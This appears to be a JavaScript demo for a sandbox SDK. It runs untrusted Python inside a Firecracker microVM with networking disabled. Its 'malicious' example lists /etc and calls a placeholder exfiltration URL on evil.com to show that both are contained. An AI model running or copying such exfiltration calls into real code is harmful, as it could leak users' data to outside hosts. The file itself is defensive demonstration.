import { Sandbox } from "@omnirun/sdk";

/**
 * Run untrusted code in an isolated Firecracker microVM.
 * The code cannot access the host filesystem, network, or processes.
 */
async function runInSandbox(code, language = "python") {
  const sandbox = await Sandbox.create("python-3.11", {
    timeout: 30,
    internet: false,
  });

  try {
    const result = await sandbox.runCode(code, language);
    return { stdout: result.stdout, stderr: result.stderr, exitCode: result.exitCode };
  } finally {
    await sandbox.kill().catch(() => {});
  }
}

// Demo: run safe code
console.log("=== Running safe code ===");
const safe = await runInSandbox(`
import platform
print(f"Python {platform.python_version()}")
print(f"OS: {platform.system()}")
print("Hello from inside a Firecracker VM!")
`);
console.log(safe.stdout);

// Demo: malicious code that tries to access host — fails safely
console.log("=== Attempting host access (will fail safely) ===");
const malicious = await runInSandbox(`
import os
# This runs inside an isolated VM — NOT on your host
try:
    files = os.listdir("/etc")
    print(f"Found {len(files)} files in /etc — but this is the VM's /etc, not yours!")
except Exception as e:
    print(f"Access denied: {e}")

# Try network access — blocked by internet: false
import urllib.request
try:
    urllib.request.urlopen("https://evil.com/exfiltrate", timeout=3)
    print("Network access succeeded — THIS SHOULD NOT HAPPEN")
except Exception as e:
    print(f"Network blocked: {type(e).__name__}")
`);
console.log(malicious.stdout);
console.log(malicious.stderr ? `stderr: ${malicious.stderr}` : "");

console.log("=== Host machine is completely untouched ===");
